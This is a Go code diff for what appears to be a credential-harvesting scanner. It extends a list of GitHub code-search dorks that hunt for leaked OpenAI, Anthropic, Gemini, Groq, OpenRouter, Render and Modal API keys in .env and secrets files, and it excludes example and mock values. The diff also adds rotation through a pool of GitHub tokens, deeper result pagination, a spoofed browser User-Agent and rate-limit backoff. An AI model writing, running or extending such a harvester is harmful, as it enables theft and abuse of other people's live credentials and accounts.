@@ -1448,29 +1448,41 @@ Target Verification:
 			`filename:values.yaml "OPENAI_API_KEY" NOT mock`,
 			`filename:wrangler.toml "OPENAI_API_KEY" NOT example`,
 			`filename:config.json "OPENAI_API_KEY" "sk-"`,
+			`"OPENAI_API_KEY=" "sk-" path:.env`,
+			`"sk-proj-" extension:env`,
 
 			// Claude Targeted
 			`filename:.env "ANTHROPIC_API_KEY=sk-ant-" NOT example`,
 			`filename:.env "CLAUDE_API_KEY=sk-ant-" NOT example`,
 			`filename:secrets.json "sk-ant-api03"`,
 			`filename:docker-compose.yml "sk-ant-" NOT example`,
+			`"ANTHROPIC_API_KEY=" "sk-ant-"`,
 
 			// Gemini Targeted
 			`filename:.env "GEMINI_API_KEY=AIzaSy" NOT example`,
 			`filename:.env "GOOGLE_API_KEY=AIzaSy" NOT example`,
 			`filename:secrets.json "AIzaSy" NOT mock`,
 			`filename:secrets.toml "AIzaSy"`,
+			`"GEMINI_API_KEY=" "AIzaSy" path:.env`,
+
+			// Groq Targeted
+			`filename:.env "GROQ_API_KEY=gsk_" NOT example`,
+			`filename:secrets.json "gsk_" NOT mock`,
+			`"GROQ_API_KEY=" "gsk_" path:.env`,
 
 			// OpenRouter Targeted
 			`filename:.env "OPENROUTER_API_KEY=sk-or-v1-" NOT example`,
 			`filename:secrets.json "sk-or-v1-"`,
 			`filename:secrets.toml "sk-or-v1-"`,
+			`"OPENROUTER_API_KEY=" "sk-or-v1-"`,
 
 			// Render Targeted
 			`"api.render.com" rnd_ filename:.env`,
 			`filename:.env "RENDER_API_KEY=rnd_" NOT example`,
 			`filename:secrets.json rnd_ NOT mock`,
 			`RENDER_API_KEY rnd_ filename:secrets.toml`,
+			`"RENDER_API_KEY=" "rnd_"`,
+			`"rnd_" path:.env "render"`,
 
 			// Modal Targeted
 			`filename:.env "MODAL_TOKEN_ID=ak-" NOT example`,
@@ -1478,11 +1490,19 @@ Target Verification:
 			`filename:secrets.toml "ak-" "as-"`,
 		}
 
+		sortModes := []string{"indexed", ""}
+		pageCycle := 1
+
 		for {
 			if GlobalPaused.Load() || tokenPool.ActiveCount() == 0 {
 				time.Sleep(2 * time.Second)
 				continue
 			}
+
+			// Alternate pagination depth: scan page 1..5 across cycles
+			targetPage := (pageCycle % 5) + 1
+			sortMode := sortModes[pageCycle%len(sortModes)]
+			pageCycle++
 
 			for _, dork := range dorks {
 				if GlobalPaused.Load() || tokenPool.ActiveCount() == 0 {
@@ -1490,15 +1510,26 @@ Target Verification:
 				}
 
 				token := tokenPool.GetRandomToken()
-				url := fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100&sort=indexed", url.QueryEscape(dork))
-				req, _ := http.NewRequest("GET", url, nil)
+				var searchURL string
+				if sortMode != "" {
+					searchURL = fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100&page=%d&sort=%s", url.QueryEscape(dork), targetPage, sortMode)
+				} else {
+					searchURL = fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100&page=%d", url.QueryEscape(dork), targetPage)
+				}
+
+				req, _ := http.NewRequest("GET", searchURL, nil)
 				if token != "" {
 					req.Header.Set("Authorization", "token "+token)
 				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
 				resp, err := client.Do(req)
 				if err == nil && resp != nil {
 					if resp.StatusCode == 401 && token != "" {
 						tokenPool.MarkDead(token)
+					} else if resp.StatusCode == 403 || resp.StatusCode == 429 {
+						// GitHub Secondary or Code Search Rate Limit reached
+						// Sleep safely to avoid blocking tokens
+						time.Sleep(10 * time.Second)
 					} else if resp.StatusCode == 200 {
 						var res struct {
 							Items []struct {
@@ -1527,11 +1558,11 @@ Target Verification:
 					}
 					resp.Body.Close()
 				}
-				// Smart pacing
-				time.Sleep(2 * time.Second)
+				// 6 seconds delay between search requests complies with GitHub 10 req/min limit per pool
+				time.Sleep(6 * time.Second)
 			}
 
-			// End of cycle smart pause
+			// End of cycle rest
 			time.Sleep(5 * time.Second)
 		}
 	}()
